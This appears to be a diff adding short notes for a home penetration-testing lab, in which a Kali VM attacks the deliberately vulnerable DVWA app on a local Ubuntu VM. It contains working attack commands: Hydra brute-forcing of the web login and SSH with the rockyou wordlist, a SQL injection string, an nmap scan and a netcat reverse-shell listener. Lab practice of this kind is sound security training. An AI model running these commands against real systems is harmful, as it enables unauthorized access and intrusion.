@@ -1,0 +1,44 @@
+Kali Linux Attack VM Notes
+--------------------------
+
+System: Kali Linux (UTM VM)
+Purpose: Launch attacks against DVWA hosted on Ubuntu VM
+
+1. Update System:
+   sudo apt update && sudo apt upgrade -y
+
+2. Install Required Tools:
+   (Most are preinstalled)
+   - Hydra:       Brute-force tool
+   - Nmap:        Network scanner
+   - Burp Suite:  Proxy/interception
+   - sqlmap:      Automated SQLi testing
+   - netcat (nc): Reverse shell listener
+
+3. RockYou Wordlist Setup:
+   sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
+
+4. Brute-force DVWA Login:
+   hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.64.5 http-post-form "/DVWA/login.php:username=^USER^&password=^PASS^:Login failed"
+
+5. SSH Brute-force (optional):
+   hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://192.168.64.5
+
+6. Basic SQL Injection Test:
+   Go to DVWA → SQL Injection
+   Use input: 1' OR '1'='1
+
+7. Run Nmap Scan:
+   nmap -sV 192.168.64.5
+
+8. Reverse Shell Listener:
+   nc -lvnp 4444
+
+9. Burp Suite Usage:
+   - Launch Burp Suite
+   - Set Firefox proxy to 127.0.0.1:8080
+   - Intercept login request
+   - Send to Repeater for fuzzing
+
+Note: Make sure both VMs are on the same virtual network (NAT or host-only).
+
